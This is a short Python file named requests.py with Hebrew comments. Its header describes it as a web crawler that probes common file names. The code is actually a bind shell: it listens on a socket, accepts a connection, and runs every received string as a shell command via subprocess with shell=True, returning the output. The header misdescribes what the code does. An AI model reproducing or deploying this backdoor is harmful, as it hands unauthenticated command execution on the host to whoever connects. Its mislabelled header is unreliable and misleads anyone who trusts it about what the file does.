# Name: requests.py
# Author: emily h. (nemo) 
# Date: 19.06.24
# Description: webcralwer that receives a file with common file names on websites and tries to access them all.

# ייבוא מודלים
import socket 
import sys 
import subprocess

# הגדרת חיבור סוקט ווידוא הצלחתו
try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print ("Socket successfully created")
except socket.error as err: 
    print ("socket creation failed with error %s" %(err))

# הגדרת פורט עליו תיוווצר ההתחברות
port = 80

# הגדרת כתובת המקור
host_ip = "127.0.0.1"  

# הגדרת העמדה כמקשיב למחשב השני שרוצה להתחבר אליו
s.bind((host_ip, port))
s.listen(5)

# הקמת התקשורת בין העמדות
c, addr = s.accept()     
print ('Got connection from', addr)

def main():
    while True: 
        # קבלת פקודה, הרצתה והחזרת הפלט לעמדה שאליה התחברנו
        command = c.recv(1024).decode()
        output = subprocess.run([command], shell=True, capture_output=True, text=True)
        output = output.stdout.encode()
        c.send(output)
        
if __name__ == "__main__":
    main()

